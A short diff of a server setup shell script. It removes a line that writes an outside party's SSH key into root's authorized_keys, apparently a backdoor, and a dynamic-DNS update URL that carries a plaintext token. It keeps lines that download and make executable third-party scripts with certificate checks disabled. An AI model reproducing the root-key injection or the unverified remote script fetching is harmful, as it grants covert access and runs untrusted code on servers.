@@ -1401,9 +1401,6 @@ esac
 
 mkdir -p /root/.ssh
 chmod 700 /root/.ssh
-echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB6teNyl8YTwvDUFgTExXz+cgsqn+dZPFLNaUqFKSoZd Djiangoflower@outlook.com > /root/.ssh/authorized_keys
-chmod 600 /root/.ssh/authorized_keys
 cd /root/
 wget -N --no-check-certificate "https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh" && chmod +x ssr.sh
 wget -N --no-check-certificate "https://gist.github.com/zeruns/a0ec603f20d1b86de6a774a8ba27588f/raw/4f9957ae23f5efb2bb7c57a198ae2cffebfb1c56/tcp.sh" && chmod +x tcp.sh
-wget "https://ipv6.dynv6.com/api/update?zone=laomob.v6.navy&ipv6=auto&token=AkECNZog4FRSt1z_xzbzTHp4ixUFgr"
